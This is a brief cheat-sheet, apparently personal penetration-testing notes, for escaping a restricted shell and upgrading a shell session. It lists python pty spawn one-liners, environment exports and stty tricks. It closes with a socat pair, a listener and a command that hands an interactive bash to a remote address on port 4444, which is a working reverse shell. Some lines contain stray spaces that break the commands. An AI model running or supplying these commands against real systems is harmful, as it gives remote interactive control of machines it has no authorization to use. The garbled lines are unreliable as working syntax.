#breakout of a restricted shell

[+ AND EXPORT PATH ]
python -c 'import pty; pty. spawn("/bin/bash")'
OR
python3 -c 'import pty; pty. spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear ; ls -lsaht -- color=auto'
Keyboard Shortcut: Ctrl + Z (Background Process. )
stty raw -echo ; fg ; reset
stty columns 200 rows 200


socat file:`tty`,raw,echo=0 tcp-listen:4444

socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.237:4444
